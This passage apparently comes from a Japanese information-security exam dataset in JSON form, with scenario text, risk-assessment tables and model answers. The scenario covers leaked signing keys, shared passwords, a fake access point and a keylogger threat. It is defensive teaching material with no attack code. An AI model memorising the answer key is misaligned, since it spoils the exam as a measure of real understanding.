          "explanation": "### 設問3 (1) 解説\n漏洩したSTORE_API_KEYとAPP_SIGN_KEY（署名鍵）を用いることで、攻撃者はPアプリのソースコードを改ざんし、正規の鍵で署名した上でJストアにアップロードし、悪意のあるアプリを流通させようとします。\n\n**解答例**: 署名鍵とAPIキーを利用し、改ざんアプリを正規アプリとしてJストアにアップロードする攻撃。\n\n### 設問3 (2) 解説\nSTORE_API_KEYが漏洩したため、攻撃者にJストアへの不正なアップロードをされる可能性があります。このキーを直ちに無効化し、新しいキーに切り替える必要があります。\n\n**解答**: APIキーを無効化し再発行する。\n\n### 設問3 (3) 解説\nHSMは秘密鍵をセキュアなハードウェア内で管理するため、秘密鍵がモジュール外に漏洩するリスクを低減し、その機密性を強固に保護できます。\n\n**解答**: 署名に用いる秘密鍵の機密性を確保できる点。\n\n### 設問3 (4) 解説\n**影響**: 漏洩した署名鍵が悪用され、Pアプリの改ざん版が流通し、利用者がそれを実行してしまうこと。\n**対応**: Pアプリ利用者に、古い署名鍵が失効したこと、最新の正規アプリに更新する必要があることを告知すること。\n\n**影響**: 不正アプリが流通する可能性\n**対応**: 新規アプリへの更新を促す"
        }
      ],
      "point": 25,
      "subCategory": "その他"
    },
    {
      "qNo": 4,
      "theme": "Risk Assessment concerning Z Information Confidentiality",
      "description": "G百貨店は、贈答品として販売される菓子類のうち、特定の地域向けに配送されるもの(以下,菓子類Fという)の配送と在庫管理をW社に委託している。G百貨店では、贈答品の受注情報を、Sサービスという受注管理SaaSに登録している。菓子類Fの受注情報(以下、菓子類Fの受注情報をZ情報という)が登録された後の、W社の配送業務におけるデータの流れは、図1のとおりである。（中略）\n\n## 図1 W社の配送業務におけるデータの流れ\n\n```mermaid\nsequenceDiagram\n    participant S_Service as Sサービス\n    participant W_Clerk as 配送管理課員\n    participant W_IS as 在庫管理サーバ\n    participant W_DS as 配送管理SaaS\n    participant W_Driver as 配送員\n    \n    W_Clerk ->> S_Service: (1) Z情報を参照\n    W_Clerk ->> W_IS: (2) 在庫品の引当て\n    W_Clerk ->> W_DS: (3) 配送指示を入力\n    W_Driver ->> W_DS: (4) 配送指示を参照\n```\n\n## 表2 W社の情報セキュリティの状況(抜粋)\n\n| 項番 | カテゴリ | 情報セキュリティの状況 |\n|---|---|---|\n| 2 | 技術的セキュリティ対策 | 全PC/サーバにパターンマッチング型マルウェア対策ソフト導入。 |\n| 5 | 技術的セキュリティ対策 | メールSaaS: 添付ファイルマルウェア検査のみ有効。（迷惑メール/キーワードブロック無効） |\n| 8 | 物理的セキュリティ対策 | 従業員であれば誰でも配送管理用PCに近づくことができる。 |\n| 12 | PW管理 | 配送管理課長が毎月PWを変更し、IDと変更後のPWをメールで課員全員に周知している。シフトの当番がアカウントを使用。 |\n| 13 | PW管理 | PWはノートなどに書いてもよいが、他人に見られないように管理するよう指示。PWを書いた付箋が、机上に貼ってあった。 |\n\n## 表4 リスクアセスメントの結果(抜粋)\n\n| リスク番号 | リスク源 | 行為又は事象の分類 | リスク源による行為又は事象 | Z情報の機密性への影響に至る経緯 | 情報セキュリティの状況 | 被害の大きさ | 発生頻度 | 総合評価 |\n|---|---|---|---|---|---|---|---|---|\n| 1-1 | W社従業員 | IDとPWの持出し (故意) | SサービスのIDとPWをメモ用紙などに書き写して、持ち出す。 | W社従業員によって持ち出されたIDとPWが利用され、W社外からSサービスにログインされて、Z情報がW社外のPCなどに保存される。 | [ ア ] | [ イ ] | 低 | [ ウ ] |\n| 1-5 | W社従業員 | IDとPWの漏えい (過失) | 誤って、SサービスのIDとPWを、W社外の第三者にメールで送信する。 | リスク番号1-2と同じ | [ a ] | 大 | 低 | C |\n| 2-2 | W社外の第三者 | W社へのサイバー攻撃 | W社のPC又はサーバの脆弱性を悪用し、インターネット上のPCからW社のPC又はサーバを不正に操作する。 | 不正に操作されたPC又はサーバが踏み台にされて、配送管理用PCにキーロガーが埋め込まれ、SサービスのIDとPWが窃取される。そのIDとPWが利用され、W社外からSサービスにログインされて、Z情報がW社外のPCなどに保存される。 | [ b ] | 大 | 低 | C |\n| 2-4 | W社外の第三者 | [ あ ] | [ あ ] | [ い ] | [ う ] | [ え ] | [ お ] | [ か ] |\n\n## 表5 追加すべき管理策の検討結果(抜粋)\n\n| リスク番号 | 管理策 |\n|---|---|\n| 1-1 | ・Sサービス利用者認証を、多要素認証に変更する。（中略）・[ エ ] |\n| 2-4 | [ き ] |\n\n（中略）",
      "questions": [
        {
          "subQNo": "設問1",
          "text": "表4及び表5中の [ ア ] 〜 [ エ ] に入れる適切な字句を答えよ。",
          "subQuestions": [
            {
              "label": "[ ア ]",
              "text": "は、表2 中から該当する項番を全て選び、数字で答えよ。該当する項番がない場合は、“なし”と答えよ。"
            },
            {
              "label": "[ イ ]",
              "text": "は答案用紙の大・中・小のいずれかの文字を○で囲んで示せ。"
            },
            {
              "label": "[ ウ ]",
              "text": "は答案用紙のA・B・C・Dのいずれかの文字を○で囲んで示せ。"
            },
            {
              "label": "[ エ ]",
              "text": "に入れる適切な字句を答えよ。"
            }
          ],
          "explanation": "### 設問1 解説\n**[ ア ]**: リスク1-1 (ID/PWの故意の持出し) は、PWの共有と管理の甘さ（12, 13）及び配送管理用PCへの物理的アクセスの容易さ（8）が原因です。\n**解答**: 8, 12, 13\n\n**[ イ ]**: ID/PWが漏洩し、一括出力機能（表1, 4）が使えるため、Z情報全てが漏洩しうるため、被害は『大』です。\n**解答**: 大\n\n**[ ウ ]**: 被害『大』、発生頻度『低』より、リスクレベルはC（表3）。\n**解答**: C\n\n**[ エ ]**: MFAとログ監視に加えて、共有アカウントによるリスクと物理的アクセス（8, 13）のリスクを補完する措置が必要です。配送管理用PCが共有されているため、アクセス時にクライアント証明書を要求することが有効です。\n**解答例**: 配送管理用PCにクライアント証明書を導入し、Sサービスへのアクセスを必須とする。"
        },
        {
          "subQNo": "設問2",
          "text": "次の問いに答えよ。",
          "subQuestions": [
            {
              "label": "(1)",
              "text": "表4中の [ あ ] に入れる適切な字句を、本文に示した状況設定に沿う範囲で、あなたの知見に基づき、答えよ。"
            },
            {
              "label": "(2)",
              "text": "解答した [ あ ] の内容に基づき、表4及び表 5 中の [ い ] 〜 [ き ] に入れる適切な字句を答えよ。\n[ え ] は答案用紙の大・中・小のいずれかの文字を○で囲んで示せ。\n[ お ] は答案用紙の高・中・低のいずれかの文字を○で囲んで示せ。\n[ か ] は答案用紙のA・B・C・Dのいずれかの文字を○で囲んで示せ。"
            }
          ],
          "explanation": "### 設問2 (1) 解説\nリスク2-4は、Q2の本文で議論された「偽AP」と「偽サイト」を用いた認証情報窃取を伴う攻撃です。\n\n**解答**: 偽APを用いたなりすまし攻撃\n\n### 設問2 (2) 解説\n**[ い ] (影響に至る経緯)**: 偽APに接続し、偽サイトでSサービスのID/PWを窃取された後、外部からログインされてZ情報が持ち出されます。\n**解答**: 偽APと偽サイトで窃取されたSサービスのIDとPWを利用され、W社外からSサービスにログインされてZ情報がW社外PCに保存される。\n\n**[ う ] (情報セキュリティの状況)**: 偽サイトに誘導された原因は、従業員の意識（9, 10）や、共有アカウントによるPW管理の甘さ（12, 13）です。\n**解答**: 9, 10, 12, 13\n\n**[ え ] (被害の大きさ)**: ID/PWが漏洩し、一括出力可能なので『大』です。\n**解答**: 大\n\n**[ お ] (発生頻度)**: 外部攻撃者が偽APを設置する行為は頻繁ではないため、『低』です。\n**解答**: 低\n\n**[ か ] (総合評価)**: 大（被害）＋低（頻度）はCです。\n**解答**: C\n\n**[ き ] (管理策)**: 偽AP攻撃を防ぐため、従業員用無線LANの認証をWPA2-PSKから、より強固なEAP-TLSなどの証明書ベースの認証に切り替えます。\n**解答**: 従業員用無線LANの認証をEAP-TLSなどの証明書認証に切り替える。"
        },
        {
          "subQNo": "設問3",
          "text": "表4中の [ a ], [ b ] に入れる適切な字句について、表2中から該当する項番を全て選び、数字で答えよ。該当する項番がない場合は、“なし”と答えよ。",
          "explanation": "### 設問3 解説\n**[ a ] (リスク1-5)**: ID/PWの過失によるメール送信と漏洩です。リスク1-2と同じ経緯を取ります。要因は、メールSaaSのキーワードブロック不足（5）、およびID/PWの共有と管理の甘さ（12, 13）です。\n**解答**: 5, 12, 13\n\n**[ b ] (リスク2-2)**: W社PC/サーバの脆弱性を悪用され、キーロガーが埋め込まれるサイバー攻撃です。要因は、パターンマッチング型マルウェア対策ソフトのみであること（2）、メールSaaSに迷惑メール/キーワードブロックがないこと（5）です。\n**解答**: 2, 5"
        }
      ],
      "point": 25,
      "subCategory": "その他"
    }
  ]
}